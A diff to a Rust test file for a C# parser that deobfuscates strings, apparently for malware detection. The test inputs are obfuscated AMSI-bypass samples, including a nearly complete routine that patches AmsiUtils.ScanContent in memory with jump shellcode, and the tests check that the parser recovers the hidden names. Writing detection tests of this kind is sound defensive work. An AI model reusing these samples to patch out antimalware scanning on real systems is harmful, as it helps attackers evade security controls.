-    Set-StrictMode -Version 2
+//     Set-StrictMode -Version 2
 
-    $RemoteScriptBlock = 
-    {
-        [CmdletBinding()]
-        Param(
-            [Parameter(Position = 0, Mandatory = $true)]
-            [String]
-            $PEBytes64,
+//     $RemoteScriptBlock = 
+//     {
+//         [CmdletBinding()]
+//         Param(
+//             [Parameter(Position = 0, Mandatory = $true)]
+//             [String]
+//             $PEBytes64,
 
-            [Parameter(Position = 1, Mandatory = $true)]
-            [String]
-            $PEBytes32,
+//             [Parameter(Position = 1, Mandatory = $true)]
+//             [String]
+//             $PEBytes32,
             
-            [Parameter(Position = 2, Mandatory = $false)]
-            [String]
-            $FuncReturnType,
+//             [Parameter(Position = 2, Mandatory = $false)]
+//             [String]
+//             $FuncReturnType,
                     
-            [Parameter(Position = 3, Mandatory = $false)]
-            [Int32]
-            $ProcId
-        )
+//             [Parameter(Position = 3, Mandatory = $false)]
+//             [Int32]
+//             $ProcId
+//         )
         
-        ###################################
-        ##########  Win32 Stuff  ##########
-        ###################################
+//         ###################################
+//         ##########  Win32 Stuff  ##########
+//         ###################################
         
-        Function Get-ProcAddress
-        {
-            Param
-            (
-                [OutputType([IntPtr])]
+//         Function Get-ProcAddress
+//         {
+//             Param
+//             (
+//                 [OutputType([IntPtr])]
             
-                [Parameter( Position = 0, Mandatory = $True )]
-                [String]
-                $Module,
+//                 [Parameter( Position = 0, Mandatory = $True )]
+//                 [String]
+//                 $Module,
                 
-                [Parameter( Position = 1, Mandatory = $True )]
-                [String]
-                $Procedure
-            )
+//                 [Parameter( Position = 1, Mandatory = $True )]
+//                 [String]
+//                 $Procedure
+//             )
 
-            $GetProcAddress = $UnsafeNativeMethods.GetMethod('GetProcAddress', [reflection.bindingflags] "Public,Static");
-        }
-        Main
-    }
-    Function Main
+//             $GetProcAddress = $UnsafeNativeMethods.GetMethod('GetProcAddress', [reflection.bindingflags] "Public,Static");
+//         }
+//         Main
+//     }
+//     Function Main
+//     {
+//         Get-ProcAddress
+//     }
+
+//     Main
+// }"#;
+
+//         let program_res = p.parse_input(input).unwrap();
+//         assert!(program_res.tokens().string_set().contains("GetProcAddress"));
+//     }
+
+//     #[test]
+//     fn command_args() {
+//         let mut p = CSharpSession::new().with_variables(Variables::env());
+
+//         let input = r#" Get-ProcAddress kernel32.dll GetProcAddress "#;
+//         let program_res = p.parse_input(input).unwrap();
+//         assert!(program_res.tokens().string_set().contains("GetProcAddress"));
+//     }
+
+    #[test]
+    fn obfuscation_hardware_breakpoints() {
+        let mut p = CSharpSession::new();
+
+        let input = r#"
+using System;
+using System.Collections.Generic;
+using System.Linq.Expressions;
+using System.Linq;
+using System.Runtime.CompilerServices;
+using System.Net;
+using System.Reflection;
+using System.Runtime.InteropServices;
+
+namespace Test
+{
+    // CCOB IS THE GOAT
+   
+    public class Program
     {
-        Get-ProcAddress
+        static string a = "msi";
+        static string b = "anB";
+        static string c = "ff";
+        static IntPtr BaseAddress = WinAPI.LoadLibrary("a" + a + ".dll");
+        static IntPtr pABuF = WinAPI.GetProcAddress(BaseAddress, "A" + a + "Sc" + b + "u" + c + "er");
+        static IntPtr pCtx = Marshal.AllocHGlobal(Marshal.SizeOf(typeof(WinAPI.CONTEXT64)));
     }
-
-    Main
 }"#;
 
-        let script_res = p.parse_input(input).unwrap();
-        assert!(script_res.tokens().string_set().contains("GetProcAddress"));
+        let program_res = p.parse_input(input).unwrap();
+        assert!(program_res.tokens().string_set().contains("amsi.dll"));
+        assert!(program_res.tokens().string_set().contains("AmsiScanBuffer"));
     }
 
     #[test]
-    fn command_args() {
-        let mut p = CSharpSession::new().with_variables(Variables::env());
+    fn obfuscation_clr_hooking_short() {
+        let mut p = CSharpSession::new();
 
-        let input = r#" Get-ProcAddress kernel32.dll GetProcAddress "#;
-        let script_res = p.parse_input(input).unwrap();
-        assert!(script_res.tokens().string_set().contains("GetProcAddress"));
+        let input = r#"
+namespace Editor {
+    public static class Methods {
+        private static string Transform(string input) {
+            return input+"Content";
+        }
+        private static string Transform2(string input) {
+            StringBuilder builder = new StringBuilder(input + "Content");    
+
+            return builder.ToString();
+        }
+        //private static readonly string CLASS1 = Methods.Transform("Scan");
+        private static readonly string CLASS1 = Methods.Transform2("Scan");
+        //private static readonly string CLASS2 = Methods.Transform2("Tztufn/Nbobhfnfou/Bvupnbujpo/BntjVujmt");
+    }
+}"#;
+
+        let program_res = p.parse_input(input).unwrap();
+        println!("{:?}", program_res.tokens());
+        assert!(program_res.tokens().string_set().contains("ScanContent"));
+        assert!(program_res.tokens().string_set().contains("System.Management.Automation.AmsiUtils"));
+    }
+
+        #[test]
+    fn obfuscation_clr_hooking_long() {
+        let mut p = CSharpSession::new();
+
+        let input = r#"
+using System;
+using System.ComponentModel;
+using System.Management.Automation;
+using System.Reflection;
+using System.Runtime.CompilerServices;
+using System.Runtime.InteropServices;
+using System.Text;
+namespace Editor {
+    public static class Methods {
+        public static void Patch() {
+            MethodInfo original = typeof(PSObject).Assembly.GetType(Methods.CLASS).GetMethod(Methods.METHOD, BindingFlags.NonPublic | BindingFlags.Static);
+            MethodInfo replacement = typeof(Methods).GetMethod("Dummy", BindingFlags.NonPublic | BindingFlags.Static);
+            Methods.Patch(original, replacement);
+        }
+        [MethodImpl(MethodImplOptions.NoOptimization | MethodImplOptions.NoInlining)]
+        private static int Dummy(string content, string metadata) {
+            return 1;
+        }
+        public static void Patch(MethodInfo original, MethodInfo replacement) {
+            //JIT compile methods
+            RuntimeHelpers.PrepareMethod(original.MethodHandle);
+            RuntimeHelpers.PrepareMethod(replacement.MethodHandle);
+            //Get pointers to the functions
+            IntPtr originalSite = original.MethodHandle.GetFunctionPointer();
+            IntPtr replacementSite = replacement.MethodHandle.GetFunctionPointer();
+            //Generate architecture specific shellcode
+            byte[] patch = null;
+            if (IntPtr.Size == 8) {
+                patch = new byte[] { 0x49, 0xbb, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x41, 0xff, 0xe3 };
+                byte[] address = BitConverter.GetBytes(replacementSite.ToInt64());
+                for (int i = 0; i < address.Length; i++) {
+                    patch[i + 2] = address[i];
+                }
+            } else {
+                patch = new byte[] { 0x68, 0x0, 0x0, 0x0, 0x0, 0xc3 };
+                byte[] address = BitConverter.GetBytes(replacementSite.ToInt32());
+                for (int i = 0; i < address.Length; i++) {
+                    patch[i + 1] = address[i];
+                }
+            }
+            //Temporarily change permissions to RWE
+            uint oldprotect;
+            if (!VirtualProtect(originalSite, (UIntPtr)patch.Length, 0x40, out oldprotect)) {
+                throw new Win32Exception();
+            }
+            //Apply the patch
+            IntPtr written = IntPtr.Zero;
+            if (!Methods.WriteProcessMemory(GetCurrentProcess(), originalSite, patch, (uint)patch.Length, out written)) {
+                throw new Win32Exception();
+            }
+            //Flush insutruction cache to make sure our new code executes
+            if (!FlushInstructionCache(GetCurrentProcess(), originalSite, (UIntPtr)patch.Length)) {
+                throw new Win32Exception();
+            }
+            //Restore the original memory protection settings
+            if (!VirtualProtect(originalSite, (UIntPtr)patch.Length, oldprotect, out oldprotect)) {
+                throw new Win32Exception();
+            }
+        }
+        private static string Transform(string input) {
+            StringBuilder builder = new StringBuilder(input.Length + 1);    
+            foreach(char c in input) {
+                char m = (char)((int)c - 1);
+                builder.Append(m);
+            }
+            return builder.ToString();
+        }
+        private static string Transform1(string input) {
+            return input+"Content";
+        }
+        [DllImport("kernel32.dll", SetLastError = true)]
+        private static extern bool FlushInstructionCache(IntPtr hProcess, IntPtr lpBaseAddress, UIntPtr dwSize);
+        [DllImport("kernel32.dll", SetLastError = true)]
+        private static extern IntPtr GetCurrentProcess();
+        [DllImport("kernel32.dll", SetLastError = true)]
+        private static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
+        [DllImport("kernel32.dll", SetLastError = true)]
+        private static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out IntPtr lpNumberOfBytesWritten);
+        private static readonly string CLASS1 = Methods.Transform1("Scan");
+        private static readonly string CLASS = Methods.Transform("Tztufn/Nbobhfnfou/Bvupnbujpo/BntjVujmt");
+        private static readonly string METHOD = Methods.Transform("TdboDpoufou");
+    }
+}"#;
+
+        let program_res = p.parse_input(input).unwrap();
+        assert!(program_res.tokens().string_set().contains("ScanContent"));
+        assert!(program_res.tokens().string_set().contains("System.Management.Automation.AmsiUtils"));
     }
 }
